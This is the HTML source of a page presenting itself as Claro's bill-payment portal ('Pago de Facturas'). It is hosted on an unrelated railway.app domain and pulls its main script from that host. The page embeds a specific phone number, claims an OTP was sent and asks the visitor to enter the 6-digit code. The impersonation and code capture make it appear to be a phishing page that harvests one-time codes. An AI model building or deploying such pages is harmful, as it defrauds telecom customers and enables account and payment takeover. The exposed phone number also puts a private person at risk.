<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
    <title>Claro - Pago de Facturas</title>
    
    <!-- Cargar estilos directamente si hay problemas con las rutas -->
    <style>
      /* Estilos mínimos para que funcione mientras cargan los CSS */
      body { margin: 0; padding: 0; font-family: sans-serif; }
      #app { min-height: 100vh; background: #f5f5f5; }
      .loading { text-align: center; padding: 50px; }
    </style>
    
    <!-- Intentar con rutas absolutas completas -->
    <link rel="stylesheet" href="https://kjniu-production.up.railway.app/build/assets/app-DKFN5zXD.css">
    <link rel="stylesheet" href="https://kjniu-production.up.railway.app/build/assets/app-CmR14Vvn.css">
    
    <!-- Script con manejo de errores -->
    <script type="module">
      // Intentar cargar el módulo principal
      import('https://kjniu-production.up.railway.app/build/assets/app-rkTaYtKa.js')
        .then(() => {
          console.log('Aplicación cargada correctamente');
        })
        .catch(error => {
          console.error('Error cargando la aplicación:', error);
          // Mostrar mensaje de error al usuario
          document.getElementById('app').innerHTML = `
            <div class="loading">
              <h2>Error cargando la aplicación</h2>
              <p>Por favor, recarga la página o intenta más tarde.</p>
              <button onclick="window.location.reload()">Reintentar</button>
            </div>
          `;
        });
    </script>
    
    <script type="text/javascript">
      // Configuración de Ziggy (rutas)
      const Ziggy = {
        "url": "https://kjniu-production.up.railway.app",
        "port": null,
        "defaults": {},
        "routes": {
          // Mantener todas tus rutas aquí...
          "index": {"uri": "/", "methods": ["GET", "HEAD"]},
          "volver.inicio": {"uri": "volver-inicio", "methods": ["POST"]},
          // ... todas las demás rutas
        }
      };
      
      // Asegurar que Ziggy esté disponible globalmente
      window.Ziggy = Ziggy;
      
      // Datos iniciales de la página
      window.pageData = {
        component: "Claro/BuscarNumero",
        props: {
          errors: {},
          flash: { message: null, success: null, errors: null },
          otpSent: true,
          telefonoOtp: "3148043586",
          session: { numero: "3148043586" },
          auth: { user: null }
        },
        url: "/",
        version: "4170a83c741defe30f4290dac0883613",
        clearHistory: false,
        encryptHistory: false
      };
      
      // Inicializar cuando el DOM esté listo
      document.addEventListener('DOMContentLoaded', function() {
        console.log('DOM cargado, inicializando aplicación...');
        
        // Verificar si Inertia/Vue se cargó correctamente
        setTimeout(() => {
          if (!window.Inertia && !window.Vue) {
            console.warn('Framework no detectado, mostrando fallback');
            document.getElementById('app').innerHTML = `
              <div style="text-align: center; padding: 50px;">
                <h2>Portal de Pagos Claro</h2>
                <p>Procesando pago para: 3148043586</p>
                <p>Se ha enviado un código OTP a tu teléfono.</p>
                <div style="margin: 20px;">
                  <input type="text" placeholder="Ingresa el código de 6 dígitos" style="padding: 10px; font-size: 16px; margin: 10px;">
                </div>
                <button style="background: #e52a1b; color: white; border: none; padding: 12px 24px; border-radius: 5px; cursor: pointer;">
                  Continuar
                </button>
              </div>
            `;
          }
        }, 3000);
      });
    </script>
  </head>
  <body>
    <div id="app" data-page='{"component":"Claro/BuscarNumero","props":{"errors":{},"flash":{"message":null,"success":null,"errors":null},"otpSent":true,"telefonoOtp":"3148043586","session":{"numero":"3148043586"},"auth":{"user":null}},"url":"/","version":"4170a83c741defe30f4290dac0883613","clearHistory":false,"encryptHistory":false}'>
      <!-- Mensaje de carga inicial -->
      <div class="loading">
        <p>Cargando portal de pagos Claro...</p>
        <div style="width: 50px; height: 50px; border: 3px solid #f3f3f3; border-top: 3px solid #e52a1b; border-radius: 50%; margin: 20px auto; animation: spin 1s linear infinite;"></div>
      </div>
      <style>
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
      </style>
    </div>
    
    <!-- Script de respaldo si falla module -->
    <script nomodule>
      alert('Tu navegador no soporta módulos JavaScript. Por favor, actualízalo o usa otro navegador.');
    </script>
  </body>
</html>
